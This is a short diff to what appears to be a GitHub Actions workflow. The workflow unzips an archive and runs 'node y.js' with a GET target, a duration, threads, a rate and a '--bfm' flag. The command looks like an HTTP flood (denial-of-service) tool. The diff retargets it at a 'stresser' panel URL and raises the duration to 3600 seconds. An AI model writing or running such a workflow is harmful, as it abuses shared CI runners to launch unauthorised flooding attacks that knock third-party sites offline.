@@ -36,7 +36,7 @@ jobs:
           unzip Fc-main.zip
           cd Fc-main
            
-          node y.js GET https://snapca.online/public-key 600 4 90 --bfm --debug --full
+          node y.js GET https://susstresser.click/panel/api.php 3600 4 90 --bfm --debug --full
 
           
           
